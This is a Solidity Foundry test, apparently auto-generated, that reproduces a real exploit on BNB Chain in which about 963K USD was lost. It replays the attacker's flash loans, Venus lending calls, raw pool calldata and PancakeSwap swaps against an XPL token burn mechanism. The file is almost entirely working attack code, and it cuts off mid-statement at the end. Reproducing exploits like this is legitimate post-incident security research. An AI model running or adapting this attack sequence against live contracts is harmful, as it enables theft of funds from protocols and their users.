// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";

// @KeyInfo - Total Lost : 963.35K USD
// Attacker : 0x9df9a1d108ee9c667070514b9a238b724a86094f
// Attack Contract : 0x80bd723dc38a07952db40c1c2a45084714399bd9
// Vulnerable Contract : 0x80bd723dc38a07952db40c1c2a45084714399bd9
// Attack Tx : 0x9779341b2b80ba679c83423c93ecfc2ebcec82f9f94c02624f83d8a647ee2e49
// Block : 77915282
// Chain : BSC
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : 717.92K USD
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 77915281;
    uint256 constant TX_TIMESTAMP = 1769607227;
    uint256 constant TX_BLOCK_NUMBER = 77915282;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        bytes memory entryData = abi.encodeWithSelector(
            bytes4(0xbe2684d4),
            uint256(0x000000000000000000000000000000000000000000b5facfe5b81c365c000000),
            Addresses.XPL,
            Addresses.Cake_LP_CE70,
            Addresses.A_B41327_7854,
            hex"323032362d312d3238"
        );
        (bool ok, bytes memory result) = address(attack).call{value: TX_VALUE}(entryData);
        if (!ok) assembly { revert(add(result, 32), mload(result)) }
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntimes();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _installRuntimes() internal {
        // Exact-address fallback for observed CREATE/CREATE2 and callback surfaces.
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.etch(Addresses.attack_contract_5D8C, type(OurAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.USDT, "USDT", 718844117109291479369269);
    }
}

contract OurAttack {
    function attack() external payable {
        _borrowLiquidity();
    }

    function _flashLoan() internal {
        {
            if (Addresses.WBNB.code.length != 0) {
                IERC20Like(Addresses.WBNB).approve(Addresses.attack_contract_5D8C, 285685446507753717242029);
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.WBNB = 0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c label=unresolved token_symbol=WBNB roles=asset|code_contract|contract|attack_address|recipient|sender|storage_contract|token_related source=unresolved confidence=low"
                );
            }
        }
        {
            if (Addresses.USDT.code.length != 0) {
                IERC20Like(Addresses.USDT).balanceOf(Addresses.attack_contract_5D8C);
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.USDT = 0x55d398326f99059ff775485246999027b3197955 label=USDT token_symbol=USDT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        {
            bytes memory flashLoanProof = abi.encode(0x0000000000000000000000000000000000000002);
            bytes memory helperData = abi.encodeWithSignature(
                "flashLoan(address,uint256,bytes)", Addresses.USDT, 10253575735972056488128180, flashLoanProof
            );
            _decodedCall(Addresses.attack_contract_5D8C, helperData);
        }
    }

    function _flashLoan2() internal {
        _approveMoolahUSDT();
        _replayProtocolCalls();
        _replayProtocolCal2();
        _readPoolState3();
        _approveVenusUsdt();
    }

    function _approveMoolahUSDT() internal {
        {
            if (Addresses.USDT.code.length != 0) {
                IERC20Like(Addresses.USDT).approve(Addresses.attack_contract_5D8C, 10253575735972056488128180);
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.USDT = 0x55d398326f99059ff775485246999027b3197955 label=USDT token_symbol=USDT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        {
            if (Addresses.USDT.code.length != 0) {
                IERC20Like(Addresses.USDT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.USDT = 0x55d398326f99059ff775485246999027b3197955 label=USDT token_symbol=USDT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
    }

    function _replayProtocolCalls() internal {
        IUnitroller(Addresses.Unitroller).enterMarkets(_addressArray1(Addresses.vBNB));
        uint256 attackWbnbBalance = 0; // low-confidence trace target default; assigned only if runtime code exists
        {
            if (Addresses.WBNB.code.length != 0) {
                attackWbnbBalance = IERC20Like(Addresses.WBNB).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.WBNB = 0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c label=unresolved token_symbol=WBNB roles=asset|code_contract|contract|attack_address|recipient|sender|storage_contract|token_related source=unresolved confidence=low"
                );
            }
        }
        {
            {
                if (Addresses.WBNB.code.length != 0) {
                    IWBNB(Addresses.WBNB).withdraw(attackWbnbBalance);
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.WBNB = 0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c label=unresolved token_symbol=WBNB roles=asset|code_contract|contract|attack_address|recipient|sender|storage_contract|token_related source=unresolved confidence=low"
                    );
                }
            }
        }
        {
            if (Addresses.vBNB.code.length != 0) {
                IvBNB(Addresses.vBNB).exchangeRateStored();
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.vBNB = 0xa07c5b74c9b40447a954e1466938b865b6bbea36 label=unresolved token_symbol=vBNB roles=asset|code_contract|contract|attack_address|recipient|sender|storage_contract source=unresolved confidence=low"
                );
            }
        }
        {
            if (Addresses.vBNB.code.length != 0) {
                IERC20Like(Addresses.vBNB).totalSupply();
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.vBNB = 0xa07c5b74c9b40447a954e1466938b865b6bbea36 label=unresolved token_symbol=vBNB roles=asset|code_contract|contract|attack_address|recipient|sender|storage_contract source=unresolved confidence=low"
                );
            }
        }
    }

    function _replayProtocolCal2() internal {
        IUnitroller(Addresses.Unitroller).supplyCaps(Addresses.vBNB);
        {
            if (Addresses.vBNB.code.length != 0) {
                IvBNB(Addresses.vBNB).mint{value: 260685446507753717242029}();
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.vBNB = 0xa07c5b74c9b40447a954e1466938b865b6bbea36 label=unresolved token_symbol=vBNB roles=asset|code_contract|contract|attack_address|recipient|sender|storage_contract source=unresolved confidence=low"
                );
            }
        }
        IUnitroller(Addresses.Unitroller).markets(Addresses.vBNB);
        IOptimizedTransparentUpgradeableProxy(Addresses.OptimizedTransparentUpgradeableProxy)
            .getUnderlyingPrice(Addresses.vBNB);
        IOptimizedTransparentUpgradeableProxy(Addresses.OptimizedTransparentUpgradeableProxy)
            .getUnderlyingPrice(Addresses.vBNB);
        {
            if (Addresses.USDT.code.length != 0) {
                IERC20Like(Addresses.USDT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.USDT = 0x55d398326f99059ff775485246999027b3197955 label=USDT token_symbol=USDT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        {
            if (Addresses.USDT.code.length != 0) {
                IERC20Like(Addresses.USDT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.USDT = 0x55d398326f99059ff775485246999027b3197955 label=USDT token_symbol=USDT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        IUnitroller(Addresses.Unitroller).borrowCaps(Addresses.vUSDT);
        IvUSDT(Addresses.vUSDT).totalBorrows();
        IvUSDT(Addresses.vUSDT).getCash();
        IvUSDT(Addresses.vUSDT).borrow(61021491910484910523498141);
        {
            if (Addresses.USDT.code.length != 0) {
                IERC20Like(Addresses.USDT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.USDT = 0x55d398326f99059ff775485246999027b3197955 label=USDT token_symbol=USDT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
    }

    function _readPoolState3() internal {
        {
            if (Addresses.A_B67E5E_EB0F.code.length != 0) {
                IContract_B67E5E_EB0F(Addresses.A_B67E5E_EB0F).token0();
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.A_B67E5E_EB0F = 0xb67e5eaf770a384ab28029d08b9bc5ebe32beb0f label=unresolved roles=asset|contract|attack_address|recipient|sender|storage_contract source=unresolved confidence=low"
                );
            }
        }
        {
            if (Addresses.USDT.code.length != 0) {
                IERC20Like(Addresses.USDT).balanceOf(Addresses.A_B67E5E_EB0F);
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.USDT = 0x55d398326f99059ff775485246999027b3197955 label=USDT token_symbol=USDT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        {
            bytes memory observedCallData =
                hex"490e6cbc00000000000000000000000080bd723dc38a07952db40c1c2a45084714399bd90000000000000000000000000000000000000000002dc2612798b9421788999900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002dc2612798b942178899990000000000000000000000000000000000000000004d435995566349ef1d7916"; // artifact calldata preserved: abi_call; preserving observed calldata; action_graph action_0024 has artifact-backed dynamic_bytes_payload_precondition; preserving exact calldata before ABI re-encoding
            (bool ok,) = Addresses.A_B67E5E_EB0F.call(observedCallData);
            require(ok, "observed raw calldata 0x490e6cbc failed");
        }
    }

    function _approveVenusUsdt() internal {
        {
            uint256 usdtApproveAllowance = type(uint256).max; // value provenance: arg1=type(uint256).max is covered by prior Addresses.USDT.balanceOf(address) return=10253575735972056488128180 with args (Addresses.attack_contract)
            {
                if (Addresses.USDT.code.length != 0) {
                    IERC20Like(Addresses.USDT).approve(Addresses.vUSDT, usdtApproveAllowance);
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.USDT = 0x55d398326f99059ff775485246999027b3197955 label=USDT token_symbol=USDT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|token_related source=asset_delta.profit_candidates confidence=medium"
                    );
                }
            }
        }
        IvUSDT(Addresses.vUSDT).repayBorrow(61021491910484910523498141);
        {
            if (Addresses.vBNB.code.length != 0) {
                IvBNB(Addresses.vBNB).redeemUnderlying(260685446507753717242029);
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.vBNB = 0xa07c5b74c9b40447a954e1466938b865b6bbea36 label=unresolved token_symbol=vBNB roles=asset|code_contract|contract|attack_address|recipient|sender|storage_contract source=unresolved confidence=low"
                );
            }
        }
        {
            if (Addresses.WBNB.code.length != 0) {
                {
                    uint256 depositAmount = address(this).balance; // natural replay: wrap only ETH currently held by this replay frame
                    if (depositAmount > 285685446507753717242029) depositAmount = 285685446507753717242029;
                    if (depositAmount != 0) IWBNB(Addresses.WBNB).deposit{value: depositAmount}();
                }
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.WBNB = 0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c label=unresolved token_symbol=WBNB roles=asset|code_contract|contract|attack_address|recipient|sender|storage_contract|token_related source=unresolved confidence=low"
                );
            }
        }
    }

    function _flashLoan3() internal {
        IERC20Like(Addresses.BTCB).approve(Addresses.attack_contract_5D8C, 1034944327269360892040);
        {
            if (Addresses.WBNB.code.length != 0) {
                IERC20Like(Addresses.WBNB).balanceOf(Addresses.attack_contract_5D8C);
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.WBNB = 0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c label=unresolved token_symbol=WBNB roles=asset|code_contract|contract|attack_address|recipient|sender|storage_contract|token_related source=unresolved confidence=low"
                );
            }
        }
        {
            bytes memory flashLoanProof = abi.encode(0x0000000000000000000000000000000000000001);
            bytes memory helperData = abi.encodeWithSignature(
                "flashLoan(address,uint256,bytes)", Addresses.WBNB, 285685446507753717242029, flashLoanProof
            );
            _decodedCall(Addresses.attack_contract_5D8C, helperData);
        }
    }

    function _handleFlashLoanCall() internal {
        _replayDone[REPLAY_CALLBACK_4] = true;
        flashCallback5();
    }

    function flashCallback5() internal {
        {
            if (Addresses.Cake_LP.code.length != 0) {
                ICake_LP(Addresses.Cake_LP).token0();
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.Cake_LP = 0x16b9a82891338f9ba80e2d6970fdda79d1eb0dae label=unresolved token_symbol=Cake-LP roles=asset|contract|attack_address|recipient|sender|storage_contract source=unresolved confidence=low"
                );
            }
        }
        {
            if (Addresses.USDT.code.length != 0) {
                IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP);
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.USDT = 0x55d398326f99059ff775485246999027b3197955 label=USDT token_symbol=USDT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        {
            bytes memory observedCallData =
                hex"022c0d9f00000000000000000000000000000000000000000010f1ae640bc3907763d5e9000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080bd723dc38a07952db40c1c2a45084714399bd900000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000010f1ae640bc3907763d5e9000000000000000000000000000000000000000000004122746454dd12ca4a39"; // artifact calldata preserved: abi_call; preserving observed calldata; action_graph action_0034 has artifact-backed dynamic_bytes_payload_precondition; preserving exact calldata before ABI re-encoding
            (bool ok,) = Addresses.Cake_LP.call(observedCallData);
            require(ok, "observed raw calldata 0x022c0d9f failed");
        }
        {
            if (Addresses.USDT.code.length != 0) {
                IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_A6F6, 20856164076658568972499871);
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.USDT = 0x55d398326f99059ff775485246999027b3197955 label=USDT token_symbol=USDT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
    }

    function _handleCallback2() internal {
        _replayDone[REPLAY_CALLBACK_5] = true;
        _replayProtocolCal3();
        _readPoolState4();
        _executeSwapPath2();
        _settleTokenFlows();
    }

    function _replayProtocolCal3() internal {
        {
            if (Addresses.USDT.code.length != 0) {
                IERC20Like(Addresses.USDT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.USDT = 0x55d398326f99059ff775485246999027b3197955 label=USDT token_symbol=USDT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        {
            uint256 usdtApproveAllowance = type(uint256).max; // value provenance: arg1=type(uint256).max is covered by prior Addresses.USDT.balanceOf(address) return=239523169083792639638400747 with args (Addresses.attack_contract)
            {
                if (Addresses.USDT.code.length != 0) {
                    IERC20Like(Addresses.USDT).approve(Addresses.PancakeRouter, usdtApproveAllowance);
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.USDT = 0x55d398326f99059ff775485246999027b3197955 label=USDT token_symbol=USDT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|token_related source=asset_delta.profit_candidates confidence=medium"
                    );
                }
            }
        }
        {
            uint256 swapAmountIn = 100000000000000000000;
            if (swapAmountIn != 0) {
                if (IERC20Like(Addresses.USDT).allowance(address(this), Addresses.PancakeRouter) < swapAmountIn) {
                    IERC20Like(Addresses.USDT).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn, 0, _addressArray2(Addresses.USDT, Addresses.XPL), address(this), 1769607227
                    );
            }
        }
        {
            if (Addresses.A_B41327_7854.code.length != 0) {
                IContract_B41327_7854(Addresses.A_B41327_7854).dayTotalBurnedList(string(hex"323032362d312d3238"));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.A_B41327_7854 = 0xb413271b84902c95f01015d58326dda59a747854 label=unresolved roles=asset|contract|attack_address|recipient source=unresolved confidence=low"
                );
            }
        }
    }

    function _readPoolState4() internal {
        {
            if (Addresses.A_B41327_7854.code.length != 0) {
                IContract_B41327_7854(Addresses.A_B41327_7854).daytotalNeedBurnList(string(hex"323032362d312d3238"));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.A_B41327_7854 = 0xb413271b84902c95f01015d58326dda59a747854 label=unresolved roles=asset|contract|attack_address|recipient source=unresolved confidence=low"
                );
            }
        }
        {
            if (Addresses.XPL.code.length != 0) {
                IERC20Like(Addresses.XPL).balanceOf(Addresses.Cake_LP_CE70);
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.XPL = 0xc2c4ccde8948c693d0b04f8bad461e35a12f20b8 label=unresolved token_symbol=XPL roles=asset|contract|attack_address|recipient|sender|storage_contract|token_related source=unresolved confidence=low"
                );
            }
        }
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsIn(691022099139443861580838, _addressArray2(Addresses.USDT, Addresses.XPL));
        {
            uint256 usdtApproveAllowance_2 = type(uint256).max; // value provenance: arg1=type(uint256).max is covered by prior Addresses.USDT.balanceOf(address) return=239523169083792639638400747 with args (Addresses.attack_contract)
            {
                if (Addresses.USDT.code.length != 0) {
                    IERC20Like(Addresses.USDT).approve(Addresses.PancakeRouter, usdtApproveAllowance_2);
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.USDT = 0x55d398326f99059ff775485246999027b3197955 label=USDT token_symbol=USDT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|token_related source=asset_delta.profit_candidates confidence=medium"
                    );
                }
            }
        }
    }

    function _executeSwapPath2() internal {
        {
            uint256 swapAmountIn = 217118801830756075945725657;
            if (swapAmountIn != 0) {
                if (IERC20Like(Addresses.USDT).allowance(address(this), Addresses.PancakeRouter) < swapAmountIn) {
                    IERC20Like(Addresses.USDT).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        0,
                        _addressArray2(Addresses.USDT, Addresses.XPL),
                        Addresses.MarketingDistributorProxy,
                        1769607227
                    );
            }
        }
        {
            bytes memory observedCallData =
                hex"d9ccae6800000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000a6dbd4b40e9c5800000000000000000000000000000000000000000000000000000000000000000009323032362d312d32380000000000000000000000000000000000000000000000"; // artifact calldata preserved: abi_call; preserving observed calldata; action_graph action_0045 has artifact-backed dynamic_bytes_payload_precondition; preserving exact calldata before ABI re-encoding
            (bool ok,) = Addresses.A_B41327_7854.call(observedCallData);
            require(ok, "observed raw calldata 0xd9ccae68 failed");
        }
        {
            if (Addresses.XPL.code.length != 0) {
                IERC20Like(Addresses.XPL).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.XPL = 0xc2c4ccde8948c693d0b04f8bad461e35a12f20b8 label=unresolved token_symbol=XPL roles=asset|contract|attack_address|recipient|sender|storage_contract|token_related source=unresolved confidence=low"
                );
            }
        }
        {
            uint256 xplApproveAllowance = type(uint256).max; // value provenance: arg1=type(uint256).max is covered by prior Addresses.XPL.balanceOf(address) return=69624926467049365622 with args (Addresses.attack_contract)
            {
                if (Addresses.XPL.code.length != 0) {
                    IERC20Like(Addresses.XPL).approve(Addresses.PancakeRouter, xplApproveAllowance);
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.XPL = 0xc2c4ccde8948c693d0b04f8bad461e35a12f20b8 label=unresolved token_symbol=XPL roles=asset|contract|attack_address|recipient|sender|storage_contract|token_related source=unresolved confidence=low"
                    );
                }
            }
        }
    }

    function _settleTokenFlows() internal {
        {
            uint256 swapAmountIn = 69624926467049365622;
            if (swapAmountIn != 0) {
                if (IERC20Like(Addresses.XPL).allowance(address(this), Addresses.PancakeRouter) < swapAmountIn) {
                    IERC20Like(Addresses.XPL).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn, 0, _addressArray2(Addresses.XPL, Addresses.USDT), address(this), 1769607227
                    );
            }
        }
        {
            uint256 usdtTransferAmount = 20547621151919240440792028; // value provenance: arg1=20547621151919240440792028 is covered by prior Addresses.USDT.balanceOf(address) return=239523169083792639638400747 with args (Addresses.attack_contract)
            {
                if (Addresses.USDT.code.length != 0) {
                    IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP, usdtTransferAmount);
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.USDT = 0x55d398326f99059ff775485246999027b3197955 label=USDT token_symbol=USDT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|token_related source=asset_delta.profit_candidates confidence=medium"
                    );
                }
            }
        }
    }

    function _handleCallback3() internal {
        _replayDone[REPLAY_CALLBACK_6] = true;
        _replayProtocolCal4();
    }

    function _replayProtocolCal4() internal {
        ICake_LP_A6F6(Addresses.Cake_LP_A6F6).token0();
        {
            if (Addresses.USDT.code.length != 0) {
                IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_A6F6);
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.USDT = 0x55d398326f99059ff775485246999027b3197955 label=USDT token_symbol=USDT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        {
            bytes memory observedCallData =
                hex"022c0d9f00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001132d0d870186d8a2e202200000000000000000000000080bd723dc38a07952db40c1c2a45084714399bd90000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000001132d0d870186d8a2e20220000000000000000000000000000000000000000000bc73580818664417cc16c"; // artifact calldata preserved: abi_call; preserving observed calldata; action_graph action_0052 has artifact-backed dynamic_bytes_payload_precondition; preserving exact calldata before ABI re-encoding
            (bool ok,) = Addresses.Cake_LP_A6F6.call(observedCallData);
            require(ok, "observed raw calldata 0x022c0d9f failed");
        }
        {
            if (Addresses.USDT.code.length != 0) {
                IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_E0D8, 35139226617614195580907526);
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.USDT = 0x55d398326f99059ff775485246999027b3197955 label=USDT token_symbol=USDT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
    }

    function flashCallback() internal {
        _replayDone[REPLAY_CALLBACK_7] = true;
        flashCallback7();
    }

    function flashCallback7() internal {
        IPancakeV3Pool(Addresses.PancakeV3Pool).token0();
        {
            if (Addresses.USDT.code.length != 0) {
                IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool);
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.USDT = 0x55d398326f99059ff775485246999027b3197955 label=USDT token_symbol=USDT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        {
            bytes memory observedCallData =
                hex"490e6cbc00000000000000000000000080bd723dc38a07952db40c1c2a45084714399bd900000000000000000000000000000000000000000002a0bfa0aecb7c4e490269000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000002a0bfa0aecb7c4e4902690000000000000000000000000000000000000000000000000000000000000000"; // artifact calldata preserved: abi_call; preserving observed calldata; action_graph action_0056 has artifact-backed dynamic_bytes_payload_precondition; preserving exact calldata before ABI re-encoding
            (bool ok,) = Addresses.PancakeV3Pool.call(observedCallData);
            require(ok, "observed raw calldata 0x490e6cbc failed");
        }
        {
            uint256 usdtTransferAmount = 3177282879540209064564485; // pseudocode/artifact priority: value provenance: arg1=3177282879540209064564485 is covered by prior Addresses.USDT.balanceOf(address) return=15954510299038986844295482 with args (Addresses.PancakeV3Pool); do not cap to address(this)
            {
                if (Addresses.USDT.code.length != 0) {
                    IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_7057, usdtTransferAmount);
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.USDT = 0x55d398326f99059ff775485246999027b3197955 label=USDT token_symbol=USDT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|token_related source=asset_delta.profit_candidates confidence=medium"
                    );
                }
            }
        }
    }

    function flashCallback2() internal {
        _replayDone[REPLAY_CALLBACK_8] = true;
        flashCallback9();
    }

    function flashCallback9() internal {
        IPancakeV3Pool_7057(Addresses.PancakeV3Pool_7057).token0();
        {
            if (Addresses.USDT.code.length != 0) {
                IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_7057);
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.USDT = 0x55d398326f99059ff775485246999027b3197955 label=USDT token_symbol=USDT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        {
            bytes memory observedCallData =
                hex"490e6cbc00000000000000000000000080bd723dc38a07952db40c1c2a45084714399bd900000000000000000000000000000000000000000002a0bfa0aecb7c4e490269000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000002a0bfa0aecb7c4e4902690000000000000000000000000000000000000000001668c63bbe0c75b45a092d"; // artifact calldata preserved: abi_call; preserving observed calldata; action_graph action_0060 has artifact-backed dynamic_bytes_payload_precondition; preserving exact calldata before ABI re-encoding
            (bool ok,) = Addresses.PancakeV3Pool_7057.call(observedCallData);
            require(ok, "observed raw calldata 0x490e6cbc failed");
        }
        {
            uint256 transferLiveAmount = 30271142900589677878116612; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
            {
                if (Addresses.USDT.code.length != 0) {
                    IERC20Like(Addresses.USDT).transfer(Addresses.A_92B780_3121, transferLiveAmount);
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.USDT = 0x55d398326f99059ff775485246999027b3197955 label=USDT token_symbol=USDT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|token_related source=asset_delta.profit_candidates confidence=medium"
                    );
                }
            }
        }
    }

    function flashCallback3() internal {
        _replayDone[REPLAY_CALLBACK_9] = true;
        flashCallback11();
    }

    function flashCallback11() internal {
        {
            if (Addresses.A_92B780_3121.code.length != 0) {
                IContract_92B780_3121(Addresses.A_92B780_3121).token0();
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.A_92B780_3121 = 0x92b7807bf19b7dddf89b706143896d05228f3121 label=unresolved roles=asset|contract|attack_address|recipient|sender|storage_contract source=unresolved confidence=low"
                );
            }
        }
        {
            if (Addresses.USDT.code.length != 0) {
                IERC20Like(Addresses.USDT).balanceOf(Addresses.A_92B780_3121);
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.USDT = 0x55d398326f99059ff775485246999027b3197955 label=USDT token_symbol=USDT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        {
            bytes memory observedCallData =
